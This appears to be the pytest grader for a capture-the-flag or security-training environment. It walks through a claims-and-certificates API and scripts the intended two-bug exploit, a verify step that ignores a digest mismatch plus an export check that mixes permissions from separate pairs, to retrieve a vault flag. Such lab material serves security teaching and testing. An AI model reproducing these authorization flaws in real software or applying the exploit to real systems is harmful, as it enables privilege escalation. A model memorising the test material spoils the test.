"""Gate 1/2: schema + both critical checks + the 8-request happy path, including
the intended exploit path that recovers the flag."""
import re

FLAG_RE = re.compile(r"^flag\{[0-9a-f]{32}\}$")


def _create_verify_seal(ep, pairs):
    c = ep["client"]
    h = ep["headers"]
    root_id = ep["catalog"]["root"]["id"]

    r = c.post("/claims", json={"parent_id": root_id}, headers=h)
    assert r.status_code == 201, r.text
    claim = r.json()
    assert claim["state"] == "DRAFT"
    assert claim["pairs"] == [["demo", "read"]]

    r = c.patch(f"/claims/{claim['id']}", json={"pairs": pairs}, headers=h)
    assert r.status_code == 200, r.text
    claim = r.json()
    assert sorted(claim["pairs"]) == sorted(pairs)

    r = c.post(f"/claims/{claim['id']}/verify", json={}, headers=h)
    assert r.status_code == 200, r.text
    verified = r.json()
    assert verified["state"] == "VERIFIED"

    r = c.post(f"/claims/{claim['id']}/seal", json={}, headers=h)
    assert r.status_code == 201, r.text
    cert = r.json()
    assert sorted(cert["pairs"]) == sorted(pairs)
    return cert


def test_ordinary_demo_export_works(episode):
    ep = episode
    c, h = ep["client"], ep["headers"]
    cert = _create_verify_seal(ep, [["demo", "read"]])

    r = c.post("/exports", json={"certificate_id": cert["id"], "resource": "demo", "action": "read"}, headers=h)
    assert r.status_code == 201, r.text
    job = r.json()
    assert job["state"] == "READY"

    r = c.get(job["links"]["retrieve"], headers=h)
    assert r.status_code == 200, r.text
    assert r.json()["content"] == "demonstration"


def test_exploit_retrieves_flag(episode):
    """The intended two-bug exploit: verify() ignores the digest mismatch (BUG 1),
    then export() authorizes (vault, read) by combining membership from two
    different authorized pairs instead of checking the exact pair (BUG 2)."""
    ep = episode
    c, h = ep["client"], ep["headers"]
    catalog = ep["catalog"]

    assert sorted(catalog["base_pairs"]) == [["demo", "read"], ["vault", "stat"]]
    assert catalog["root"]["pairs"] == [["demo", "read"]]

    mixed_pairs = [["demo", "read"], ["vault", "stat"]]
    cert = _create_verify_seal(ep, mixed_pairs)
    assert ("vault", "read") not in [tuple(p) for p in cert["pairs"]]

    r = c.post("/exports", json={"certificate_id": cert["id"], "resource": "vault", "action": "read"}, headers=h)
    assert r.status_code == 201, r.text
    job = r.json()
    assert job["state"] == "READY"

    r = c.get(job["links"]["retrieve"], headers=h)
    assert r.status_code == 200, r.text
    content = r.json()["content"]
    assert FLAG_RE.match(content), f"expected flag format, got {content!r}"


def test_verify_accepts_mismatched_digest_against_root_approved(episode):
    """Directly demonstrates BUG 1: a claim whose digest differs from the root's
    approved_digest is still accepted by verify()."""
    ep = episode
    c, h = ep["client"], ep["headers"]
    root_id = ep["catalog"]["root"]["id"]

    r = c.post("/claims", json={"parent_id": root_id}, headers=h)
    claim = r.json()
    c.patch(f"/claims/{claim['id']}", json={"pairs": [["demo", "read"], ["vault", "stat"]]}, headers=h)

    r = c.get(f"/claims/{claim['id']}", headers=h)
    current_digest = r.json()["digest"]
    root_approved = ep["catalog"]["root"]["approved_digest"]
    assert current_digest != root_approved

    r = c.post(f"/claims/{claim['id']}/verify", json={}, headers=h)
    assert r.status_code == 200
    assert r.json()["state"] == "VERIFIED"
